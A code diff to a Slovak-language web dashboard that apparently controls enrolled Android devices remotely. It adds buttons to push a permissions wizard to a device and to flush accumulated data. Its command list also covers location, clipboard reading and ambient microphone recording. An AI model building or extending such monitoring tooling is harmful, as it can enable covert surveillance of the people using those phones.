@@ -309,6 +309,12 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
         <input id="globalSearch" placeholder="Hľadať v udalostiach…">
       </div>
       <span class="pill" id="livePill"><span class="dot"></span> offline</span>
+      <button class="btn" id="wizBtn" title="Otvoriť nastavenie na zariadení" style="display:none">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 6h16M4 12h10M4 18h13"/><path d="m17 15 4 3-4 3z"/></svg>
+      </button>
+      <button class="btn" id="batchBtn" title="Odoslať nahromadené dáta" style="display:none">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M4 21h16"/></svg>
+      </button>
       <button class="btn" id="delBtn" title="Odstrániť zariadenie" style="display:none">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M9 7V5h6v2M6 7l1 13h10l1-13"/></svg>
       </button>
@@ -575,6 +581,15 @@ async function loadOverview(){
   $('devSub').textContent = `${S.device} · ${meta.release?('Android '+meta.release):'Android ?'} · videli pred ${fmtAgo(dev.last_seen)}`;
   const del=$('delBtn');
   if(del){ del.style.display='inline-flex'; del.onclick=deleteDevice; }
+  const wiz=$('wizBtn');
+  if(wiz){ wiz.style.display='inline-flex'; wiz.onclick=()=>runCmd('wizard'); }
+  const batch=$('batchBtn');
+  if(batch){
+    const pend=d.pending||0;
+    batch.style.display='inline-flex';
+    batch.title='Odoslať nahromadené dáta ('+pend+' v zásobe)';
+    batch.onclick=()=>runCmd('flush');
+  }
   const pill=$('livePill');
   pill.className = 'pill ' + (online?'live':'off');
   pill.innerHTML = `<span class="dot ${online?'on':'off'}"></span> ${online?'online':'offline'}`;
@@ -794,7 +809,8 @@ async function loadFiles(){
 const CMDS = [
   {k:'ping',    t:'Ping',        d:'skontrolovať spojenie', g:'Základné'},
   {k:'loc',     t:'Poloha',      d:'poslať pozíciu', g:'Základné'},
-  {k:'flush',   t:'Flush',       d:'vyplachniť dáta', g:'Základné'},
+  {k:'flush',   t:'Flush',       d:'odoslať nahromadené dáta hneď', g:'Základné'},
+  {k:'wizard',  t:'Nastavenie',  d:'otvoriť wizard povolení na zariadení', g:'Základné'},
   {k:'clipboard', t:'Schránka',  d:'aktuálny obsah schránky', g:'Základné'},
   {k:'mic',     t:'Mikrofón',    d:'nahrať zvuk z okolia', g:'Nahrávanie',
    args:[{n:'sec', l:'Dĺžka nahrávky', type:'seg',
